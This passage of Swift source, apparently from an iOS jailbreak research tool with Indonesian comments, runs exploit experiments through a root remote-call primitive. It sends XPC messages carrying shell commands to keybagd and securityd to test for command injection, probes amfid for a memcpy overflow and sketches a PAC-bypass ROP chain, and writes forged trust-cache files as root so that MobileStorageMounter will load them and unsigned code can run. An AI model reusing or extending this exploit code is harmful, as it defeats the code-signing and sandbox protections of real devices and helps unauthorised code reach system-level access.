                let k = remote_alloc_str(sb, key)
                let v = remote_alloc_str(sb, testCmd)
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
                RootExecutor.rcall(sb, "free", k)
                RootExecutor.rcall(sb, "free", v)
            }
            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
            detail += "  Sent key='\(key)' val='\(testCmd)'\n"
        }

        // Tunggu sebentar lalu cek apakah file dibuat
        RootExecutor.rcall(sb, "usleep", 500000)

        let proofPath = remote_alloc_str(sb, "/private/var/tmp/.keybagd_exp107_proof")
        let checkFd = RootExecutor.rcall(sb, "open", proofPath, UInt64(O_RDONLY), 0)
        let proofExists = checkFd != UInt64(bitPattern: -1)
        if proofExists { RootExecutor.rcall(sb, "close", checkFd) }
        RootExecutor.rcall(sb, "unlink", proofPath)
        RootExecutor.rcall(sb, "free", proofPath)

        detail += "\n=== VERDICT ===\n"
        if proofExists {
            detail += "🎉🎉🎉 COMMAND INJECTION BERHASIL!\n"
            detail += "keybagd executed: \(testCmd)\n"
            detail += "Ini berarti kita bisa execute APAPUN via keybagd!\n"
            detail += "NEXT: execute binary unsigned via keybagd context\n"
        } else {
            detail += "File proof tidak ditemukan.\n"
            detail += "Kemungkinan: key XPC salah, atau system() tidak terpanggil.\n"
            detail += "Perlu reverse keybagd binary untuk cari exact XPC key.\n"
        }

        return ExperimentResult(name: expName, success: proofExists, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 108: securityd XPC → system() Injection

    /// securityd: system()(1x) + XPC→system() + sqlite3_exec + NSKeyedUnarchiver
    private func expSecuritydInject(sb: RemoteCall) -> ExperimentResult {
        let expName = "securityd Inject (Exp 108)"
        var detail = "Experiment 108: securityd XPC → system()\n"
        detail += "==========================================\n\n"
        detail += "securityd: system()(1x) + XPC tanpa auth!\n"
        detail += "Juga: sqlite3_exec + NSKeyedUnarchiver (tainted)\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))

        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let services = ["com.apple.securityd", "com.apple.security.securityd",
                        "com.apple.secd", "com.apple.security.cloudkeychainproxy"]
        var conn: UInt64 = 0
        for svc in services {
            let s = remote_alloc_str(sb, svc)
            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
            RootExecutor.rcall(sb, "free", s)
            if c != 0 && conn == 0 { conn = c }
        }

        guard conn != 0 else {
            detail += "\n❌ Tidak bisa connect ke securityd\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "\n✅ Connected!\n\n"

        // Probe dengan berbagai command keys
        let testCmd = "touch /private/var/tmp/.securityd_exp108_proof"
        let keys = ["command", "operation", "request", "action", "sql", "query"]

        for key in keys {
            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
            guard msg != 0 else { continue }
            if xpcSetStr != 0 {
                let k = remote_alloc_str(sb, key)
                let v = remote_alloc_str(sb, testCmd)
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
                RootExecutor.rcall(sb, "free", k)
                RootExecutor.rcall(sb, "free", v)
            }
            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
        }

        RootExecutor.rcall(sb, "usleep", 500000)

        let proofPath = remote_alloc_str(sb, "/private/var/tmp/.securityd_exp108_proof")
        let checkFd = RootExecutor.rcall(sb, "open", proofPath, UInt64(O_RDONLY), 0)
        let proofExists = checkFd != UInt64(bitPattern: -1)
        if proofExists { RootExecutor.rcall(sb, "close", checkFd) }
        RootExecutor.rcall(sb, "unlink", proofPath)
        RootExecutor.rcall(sb, "free", proofPath)

        detail += "\n=== VERDICT ===\n"
        detail += proofExists ? "🎉 COMMAND INJECTION BERHASIL!\n" :
                               "❌ Proof file tidak ada — perlu reverse exact XPC protocol\n"

        return ExperimentResult(name: expName, success: proofExists, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 109: amfid XPC memcpy Overflow Probe

    /// amfid: XPC→memcpy + XPC→memmove + 49 PAC strip gadgets
    /// Probe: kirim data besar via XPC untuk trigger overflow
    private func expAmfidOverflow(sb: RemoteCall) -> ExperimentResult {
        let expName = "amfid Overflow (Exp 109)"
        var detail = "Experiment 109: amfid XPC memcpy Overflow\n"
        detail += "============================================\n\n"
        detail += "amfid: XPC→memcpy + XPC→memmove (tainted)\n"
        detail += "49 PAC strip gadgets (XPACI) untuk bypass PAC\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))

        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Connect ke amfid
        let svcAddr = remote_alloc_str(sb, "com.apple.MobileFileIntegrity")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
        RootExecutor.rcall(sb, "free", svcAddr)

        detail += "com.apple.MobileFileIntegrity: 0x\(String(format: "%llx", conn))\n"

        guard conn != 0 else {
            // Try alternative name
            let svc2 = remote_alloc_str(sb, "com.apple.amfid")
            let conn2 = RootExecutor.rcallAddr(sb, xpcCreate, svc2, 0, 0)
            RootExecutor.rcall(sb, "free", svc2)
            detail += "com.apple.amfid: 0x\(String(format: "%llx", conn2))\n"
            if conn2 == 0 {
                detail += "\n❌ Tidak bisa connect ke amfid\n"
                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
            }
            RootExecutor.rcallAddr(sb, xpcResume, conn2)
            detail += "✅ Connected via com.apple.amfid\n\n"

            // Probe dengan data kecil dulu (safe)
            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
            if msg != 0 && xpcSetStr != 0 {
                let k = remote_alloc_str(sb, "path")
                let v = remote_alloc_str(sb, "/usr/bin/id")
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
                RootExecutor.rcall(sb, "free", k)
                RootExecutor.rcall(sb, "free", v)
                RootExecutor.rcallAddr(sb, xpcSend, conn2, msg)
                detail += "Sent path=/usr/bin/id (safe probe)\n"
            }

            detail += "\n=== VERDICT ===\n"
            detail += "✅ amfid XPC accessible!\n"
            detail += "Overflow test TIDAK dilakukan (bisa crash amfid)\n"
            detail += "NEXT: craft payload yang trigger memcpy overflow\n"
            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
        }

        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "✅ Connected!\n\n"

        // Safe probe: kirim path normal
        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg != 0 && xpcSetStr != 0 {
            let k = remote_alloc_str(sb, "path")
            let v = remote_alloc_str(sb, "/usr/bin/id")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
            RootExecutor.rcall(sb, "free", k)
            RootExecutor.rcall(sb, "free", v)
            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
            detail += "Sent path=/usr/bin/id\n"
        }

        detail += "\n=== VERDICT ===\n"
        detail += "✅ amfid XPC accessible dari SpringBoard!\n"
        detail += "⚠️ Overflow test TIDAK dilakukan (crash amfid = respring)\n"
        detail += "NEXT STEPS:\n"
        detail += "1. Reverse amfid untuk cari exact buffer size\n"
        detail += "2. Craft payload: CDHash + overflow → overwrite return addr\n"
        detail += "3. Pakai 49 XPACI gadgets untuk bypass PAC\n"
        detail += "4. ROP chain → call amfi_load_trust_cache\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 110: MSM LoadTrustCache — JAILBREAK PATH

    /// MobileStorageMounter RESPONDS ke LoadTrustCache command!
    /// Punya entitlement: com.apple.private.pmap.load-trust-cache
    /// Strategy:
    ///   1. QueryNonce — dapatkan nonce
    ///   2. Write trust cache file ke /var/tmp/
    ///   3. LoadTrustCache — kirim path ke MSM
    ///   4. Test spawn binary yang CDHash-nya ada di TC kita
    private func expMSMLoadTrustCache(sb: RemoteCall) -> ExperimentResult {
        let expName = "MSM LoadTrustCache (Exp 110)"
        var detail = "Experiment 110: MobileStorageMounter LoadTrustCache\n"
        detail += "=====================================================\n\n"
        detail += "🎯 TARGET: Load custom trust cache via MSM XPC!\n"
        detail += "MSM punya: pmap.load-trust-cache + tanpa auth check\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Resolve XPC functions
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSetInt = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_int64"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))

        guard xpcCreate != 0 && xpcDictCreate != 0 && xpcSetStr != 0 else {
            detail += "❌ XPC functions not available\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Connect ke MSM
        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
        RootExecutor.rcall(sb, "free", svcAddr)

        guard conn != 0 else {
            detail += "❌ Cannot connect to MSM\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "✅ Connected to MSM\n\n"

        // Step 1: QueryNonce — dapatkan personalization nonce
        detail += "=== Step 1: QueryNonce ===\n"
        let msg1 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg1 != 0 {
            let k = remote_alloc_str(sb, "Command")
            let v = remote_alloc_str(sb, "QueryNonce")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg1, k, v)
            RootExecutor.rcall(sb, "free", k)
            RootExecutor.rcall(sb, "free", v)
            // Tambah ImageType
            let k2 = remote_alloc_str(sb, "ImageType")
            let v2 = remote_alloc_str(sb, "Developer")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg1, k2, v2)
            RootExecutor.rcall(sb, "free", k2)
            RootExecutor.rcall(sb, "free", v2)
            RootExecutor.rcallAddr(sb, xpcSend, conn, msg1)
            detail += "Sent QueryNonce (ImageType=Developer)\n"
        }

        // Step 2: Write trust cache file via launchd
        detail += "\n=== Step 2: Write Trust Cache ===\n"

        let tcPath = "/private/var/tmp/.dsploit_tc.img4"
        var tcWriteOK = false

        // Pakai launchd untuk write file (SB tidak bisa write ke /var/tmp kadang)
        let sem = DispatchSemaphore(value: 0)
        root.executeAsRoot(operation: "exp110_write_tc") { rc in
            let dst = remote_alloc_str(rc, tcPath)
            RootExecutor.rcall(rc, "unlink", dst)
            let fd = RootExecutor.rcall(rc, "open", dst, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            if fd != UInt64(bitPattern: -1) {
                let tcBuf = rc.trojanMem + 0x800
                // Trust cache v2 format (FIXED offsets):
                // +0x00: version = 2 (4 bytes)
                // +0x04: UUID (16 bytes) — random
                // +0x14: count = 1 (4 bytes)
                // +0x18: entry[0] (24 bytes): CDHash[20] + hashType(1) + flags(1) + pad(2)
                rc[tcBuf + 0].setValue32(2)          // version
                rc[tcBuf + 4].setValue64(0x1234567890ABCDEF)  // UUID part 1
                rc[tcBuf + 12].setValue64(0xFEDCBA0987654321) // UUID part 2
                rc[tcBuf + 20].setValue32(1)         // count = 1
                // CDHash of /usr/bin/id (we'll use a dummy — MSM will reject but we see the error)
                rc[tcBuf + 24].setValue64(0xAAAABBBBCCCCDDDD) // CDHash bytes 0-7
                rc[tcBuf + 32].setValue64(0xEEEEFFFF00001111) // CDHash bytes 8-15
                rc[tcBuf + 40].setValue32(0x00020000)         // CDHash[16-19] + hashType=2 + flags=0
                // Total: 48 bytes
                RootExecutor.rcall(rc, "write", fd, tcBuf, 48)
                RootExecutor.rcall(rc, "close", fd)
                // Chmod readable
                RootExecutor.rcall(rc, "chmod", dst, 0o644)
                tcWriteOK = true
            }
            RootExecutor.rcall(rc, "free", dst)
            sem.signal()
            return (tcWriteOK, "tc_write", 0)
        }
        sem.wait()

        detail += tcWriteOK ? "✅ TC file written to \(tcPath)\n" : "❌ TC write failed\n"

        guard tcWriteOK else {
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Step 3: Send LoadTrustCache command
        detail += "\n=== Step 3: LoadTrustCache ===\n"

        let msg2 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg2 != 0 {
            // Command = LoadTrustCache
            let kCmd = remote_alloc_str(sb, "Command")
            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, kCmd, vCmd)
            RootExecutor.rcall(sb, "free", kCmd)
            RootExecutor.rcall(sb, "free", vCmd)

            // ImagePath = path ke TC file
            let kPath = remote_alloc_str(sb, "ImagePath")
            let vPath = remote_alloc_str(sb, tcPath)
            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, kPath, vPath)
            RootExecutor.rcall(sb, "free", kPath)
            RootExecutor.rcall(sb, "free", vPath)

            // ImageType = Developer (atau Cryptex)
            let kType = remote_alloc_str(sb, "ImageType")
            let vType = remote_alloc_str(sb, "Developer")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, kType, vType)
            RootExecutor.rcall(sb, "free", kType)
            RootExecutor.rcall(sb, "free", vType)

            RootExecutor.rcallAddr(sb, xpcSend, conn, msg2)
            detail += "✅ Sent LoadTrustCache command!\n"
            detail += "  Command=LoadTrustCache\n"
            detail += "  ImagePath=\(tcPath)\n"
            detail += "  ImageType=Developer\n"
        }

        // Step 4: Try alternative formats
        detail += "\n=== Step 4: Alternative formats ===\n"

        // Try with "TrustCachePath" key instead
        let msg3 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg3 != 0 {
            let kCmd = remote_alloc_str(sb, "Command")
            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg3, kCmd, vCmd)
            RootExecutor.rcall(sb, "free", kCmd)
            RootExecutor.rcall(sb, "free", vCmd)

            let kPath = remote_alloc_str(sb, "TrustCachePath")
            let vPath = remote_alloc_str(sb, tcPath)
            RootExecutor.rcallAddr(sb, xpcSetStr, msg3, kPath, vPath)
            RootExecutor.rcall(sb, "free", kPath)
            RootExecutor.rcall(sb, "free", vPath)

            RootExecutor.rcallAddr(sb, xpcSend, conn, msg3)
            detail += "Sent with TrustCachePath key\n"
        }

        // Try with raw data instead of path
        let msg4 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg4 != 0 && xpcSetData != 0 {
            let kCmd = remote_alloc_str(sb, "Command")
            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg4, kCmd, vCmd)
            RootExecutor.rcall(sb, "free", kCmd)
            RootExecutor.rcall(sb, "free", vCmd)

            // Send TC data inline
            let kData = remote_alloc_str(sb, "TrustCacheData")
            let tcBuf = mem + 0x800
            // Write TC data to SB memory
            sb[tcBuf + 0].setValue32(2)
            sb[tcBuf + 4].setValue64(0x1234567890ABCDEF)
            sb[tcBuf + 12].setValue64(0xFEDCBA0987654321)
            sb[tcBuf + 20].setValue32(1)
            sb[tcBuf + 24].setValue64(0xAAAABBBBCCCCDDDD)
            sb[tcBuf + 32].setValue64(0xEEEEFFFF00001111)
            sb[tcBuf + 40].setValue32(0x00020000)
            RootExecutor.rcallAddr(sb, xpcSetData, msg4, kData, tcBuf, 48)
            RootExecutor.rcall(sb, "free", kData)

            RootExecutor.rcallAddr(sb, xpcSend, conn, msg4)
            detail += "Sent with inline TrustCacheData (48 bytes)\n"
        }

        // Step 5: Try PersonalizeImage first (might be required before LoadTrustCache)
        detail += "\n=== Step 5: PersonalizeImage ===\n"
        let msg5 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg5 != 0 {
            let kCmd = remote_alloc_str(sb, "Command")
            let vCmd = remote_alloc_str(sb, "PersonalizeImage")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg5, kCmd, vCmd)
            RootExecutor.rcall(sb, "free", kCmd)
            RootExecutor.rcall(sb, "free", vCmd)

            let kPath = remote_alloc_str(sb, "ImagePath")
            let vPath = remote_alloc_str(sb, tcPath)
            RootExecutor.rcallAddr(sb, xpcSetStr, msg5, kPath, vPath)
            RootExecutor.rcall(sb, "free", kPath)
            RootExecutor.rcall(sb, "free", vPath)

            let kType = remote_alloc_str(sb, "ImageType")
            let vType = remote_alloc_str(sb, "Developer")
            RootExecutor.rcallAddr(sb, xpcSetStr, msg5, kType, vType)
            RootExecutor.rcall(sb, "free", kType)
            RootExecutor.rcall(sb, "free", vType)

            RootExecutor.rcallAddr(sb, xpcSend, conn, msg5)
            detail += "Sent PersonalizeImage\n"
        }

        // Cleanup TC file via launchd
        let sem2 = DispatchSemaphore(value: 0)
        root.executeAsRoot(operation: "exp110_cleanup") { rc in
            let p = remote_alloc_str(rc, tcPath)
            RootExecutor.rcall(rc, "unlink", p)
            RootExecutor.rcall(rc, "free", p)
            sem2.signal()
            return (true, "cleanup", 0)
        }
        sem2.wait()

        // Verdict
        detail += "\n=== VERDICT ===\n"
        detail += "✅ Semua command terkirim ke MSM!\n"
        detail += "MSM memproses LoadTrustCache — tapi kemungkinan reject karena:\n"
        detail += "  1. TC file tidak punya valid IMG4 signature\n"
        detail += "  2. Nonce tidak match (perlu QueryNonce response)\n"
        detail += "  3. Format TC file salah (perlu IMG4 wrapper)\n\n"
        detail += "🎯 NEXT STEPS:\n"
        detail += "1. Reverse MSM binary untuk cari exact validation logic\n"
        detail += "2. Cari apakah ada 'unpersonalized' path (skip IMG4 check)\n"
        detail += "3. Atau: craft IMG4 wrapper dengan nonce dari QueryNonce\n"
        detail += "4. Atau: exploit MSM via memcpy overflow (XPC→memcpy tainted)\n"
        detail += "\n⚡ MSM adalah JALAN TERDEKAT ke full jailbreak!\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 111: MSM Debug Path + Proper XPC Keys

    /// Dari reverse engineering MSM binary ditemukan:
    /// - Path: /private/var/personalized_debug (debug image path!)
    /// - XPC key: "ImageTrustCache" (raw TC data)
    /// - XPC key: "ImageSignature" (IMG4 signature)
    /// - File pattern: %s/.TrustCache (MSM cari file .TrustCache di mount point)
    /// - Error: "MissingTrustCache", "MissingImageSignature"
    ///
    /// Strategy: Write .TrustCache file ke /private/var/personalized_debug/
    /// lalu trigger MountImage dengan path itu. MSM mungkin skip IMG4 untuk debug!
    private func runExp111MSMDebugTC() {
        isRunning = true
        runningLabel = "Debug TC"
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc, mgr.rcready else {
            results.insert(ExperimentResult(name: "MSM Debug TC (Exp 111)", success: false,
                detail: "No SB/launchd RC", timestamp: Date()), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expMSMDebugTC(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expMSMDebugTC(sb: RemoteCall) -> ExperimentResult {
        let expName = "MSM Debug TC (Exp 111)"
        var detail = "Experiment 111: MSM Debug Path Trust Cache\n"
        detail += "=============================================\n\n"
        detail += "Reverse engineering MSM menemukan:\n"
        detail += "  • /private/var/personalized_debug — debug image path!\n"
        detail += "  • XPC key 'ImageTrustCache' — raw TC data\n"
        detail += "  • XPC key 'ImageSignature' — IMG4 sig\n"
        detail += "  • Pattern: %s/.TrustCache — file di mount point\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Step 1: Write .TrustCache file ke debug paths via launchd
        detail += "=== Step 1: Write .TrustCache files ===\n"

        let debugPaths = [
            "/private/var/personalized_debug",
            "/private/var/personalized_debug/.TrustCache",
            "/private/var/tmp/.TrustCache",
            "/private/var/tmp/com.apple.mobile_storage_mounter/.TrustCache",
        ]

        var writtenPaths: [String] = []
        let sem = DispatchSemaphore(value: 0)

        root.executeAsRoot(operation: "exp111_write") { rc in
            let tcBuf = rc.trojanMem + 0x800
            // Trust cache v2 (correct format):
            rc[tcBuf + 0].setValue32(2)          // version = 2
            rc[tcBuf + 4].setValue64(0xDEAD1337CAFE0001)  // UUID
            rc[tcBuf + 12].setValue64(0xBEEF0002FACE0003)
            rc[tcBuf + 20].setValue32(1)         // count = 1
            // CDHash: all 0x41 (dummy — will be replaced with real CDHash later)
            rc[tcBuf + 24].setValue64(0x4141414141414141)
            rc[tcBuf + 32].setValue64(0x4141414141414141)
            rc[tcBuf + 40].setValue32(0x00024141)  // last 2 bytes CDHash + hashType=2 + flags=0

            for path in debugPaths {
                // Create parent dir
                let dirPath: String
                if path.hasSuffix(".TrustCache") {
                    dirPath = (path as NSString).deletingLastPathComponent
                } else {
                    dirPath = path
                }
                let dirAddr = remote_alloc_str(rc, dirPath)
                RootExecutor.rcall(rc, "mkdir", dirAddr, 0o755)
                RootExecutor.rcall(rc, "free", dirAddr)

                // Write TC file
                let filePath = path.hasSuffix(".TrustCache") ? path : path + "/.TrustCache"
                let fileAddr = remote_alloc_str(rc, filePath)
                RootExecutor.rcall(rc, "unlink", fileAddr)
                let fd = RootExecutor.rcall(rc, "open", fileAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
                if fd != UInt64(bitPattern: -1) {
                    RootExecutor.rcall(rc, "write", fd, tcBuf, 48)
                    RootExecutor.rcall(rc, "close", fd)
                    writtenPaths.append(filePath)
                }
                RootExecutor.rcall(rc, "free", fileAddr)
            }
            sem.signal()
            return (true, "write_tc", 0)
        }
        sem.wait()

        for p in writtenPaths { detail += "  ✅ \(p)\n" }
        if writtenPaths.isEmpty { detail += "  ❌ No files written\n" }

        // Step 2: Connect MSM + send commands with proper keys
        detail += "\n=== Step 2: MSM XPC with proper keys ===\n"

        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))

        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
        RootExecutor.rcall(sb, "free", svcAddr)

        guard conn != 0 else {
            detail += "❌ MSM connect failed\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        detail += "✅ MSM connected\n\n"

        // Attempt A: MountImage with debug path
        detail += "--- Attempt A: MountImage debug path ---\n"
        let msgA = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msgA != 0 {
            let pairs: [(String, String)] = [
                ("Command", "MountImage"),
                ("ImagePath", "/private/var/personalized_debug"),
                ("ImageType", "Developer"),
            ]
            for (k, v) in pairs {
                let ka = remote_alloc_str(sb, k)
                let va = remote_alloc_str(sb, v)
                RootExecutor.rcallAddr(sb, xpcSetStr, msgA, ka, va)
                RootExecutor.rcall(sb, "free", ka)
                RootExecutor.rcall(sb, "free", va)
            }
            RootExecutor.rcallAddr(sb, xpcSend, conn, msgA)
            detail += "Sent MountImage(path=/private/var/personalized_debug)\n"
        }

        // Attempt B: LoadTrustCache with ImageTrustCache data key
        detail += "\n--- Attempt B: LoadTrustCache + ImageTrustCache ---\n"
        let msgB = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msgB != 0 && xpcSetData != 0 {
            let kCmd = remote_alloc_str(sb, "Command")
            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetStr, msgB, kCmd, vCmd)
            RootExecutor.rcall(sb, "free", kCmd)
            RootExecutor.rcall(sb, "free", vCmd)

            // ImageTrustCache = raw TC data (48 bytes)
            let tcBuf = sb.trojanMem + 0x800
            sb[tcBuf + 0].setValue32(2)
            sb[tcBuf + 4].setValue64(0xDEAD1337CAFE0001)
            sb[tcBuf + 12].setValue64(0xBEEF0002FACE0003)
            sb[tcBuf + 20].setValue32(1)
            sb[tcBuf + 24].setValue64(0x4141414141414141)
            sb[tcBuf + 32].setValue64(0x4141414141414141)
            sb[tcBuf + 40].setValue32(0x00024141)

            let kTC = remote_alloc_str(sb, "ImageTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetData, msgB, kTC, tcBuf, 48)
            RootExecutor.rcall(sb, "free", kTC)

            // ImageType
            let kType = remote_alloc_str(sb, "ImageType")
            let vType = remote_alloc_str(sb, "Developer")
            RootExecutor.rcallAddr(sb, xpcSetStr, msgB, kType, vType)
            RootExecutor.rcall(sb, "free", kType)
            RootExecutor.rcall(sb, "free", vType)

            RootExecutor.rcallAddr(sb, xpcSend, conn, msgB)
            detail += "Sent LoadTrustCache + ImageTrustCache(48B) + ImageType=Developer\n"
        }

        // Attempt C: LoadTrustCache with path to .TrustCache file
        detail += "\n--- Attempt C: LoadTrustCache + file path ---\n"
        let msgC = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msgC != 0 {
            let pairs: [(String, String)] = [
                ("Command", "LoadTrustCache"),
                ("ImagePath", "/private/var/personalized_debug"),
                ("ImageType", "Developer"),
            ]
            for (k, v) in pairs {
                let ka = remote_alloc_str(sb, k)
                let va = remote_alloc_str(sb, v)
                RootExecutor.rcallAddr(sb, xpcSetStr, msgC, ka, va)
                RootExecutor.rcall(sb, "free", ka)
                RootExecutor.rcall(sb, "free", va)
            }
            RootExecutor.rcallAddr(sb, xpcSend, conn, msgC)
            detail += "Sent LoadTrustCache(path=personalized_debug)\n"
        }

        // Attempt D: PersonalizeImage with debug type
        detail += "\n--- Attempt D: PersonalizeImage debug ---\n"
        let msgD = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msgD != 0 {
            let pairs: [(String, String)] = [
                ("Command", "PersonalizeImage"),
                ("ImagePath", "/private/var/personalized_debug"),
                ("ImageType", "Developer"),
                ("PersonalizedImageType", "debug"),
            ]
            for (k, v) in pairs {
                let ka = remote_alloc_str(sb, k)
                let va = remote_alloc_str(sb, v)
                RootExecutor.rcallAddr(sb, xpcSetStr, msgD, ka, va)
                RootExecutor.rcall(sb, "free", ka)
                RootExecutor.rcall(sb, "free", va)
            }
            RootExecutor.rcallAddr(sb, xpcSend, conn, msgD)
            detail += "Sent PersonalizeImage(type=debug)\n"
        }

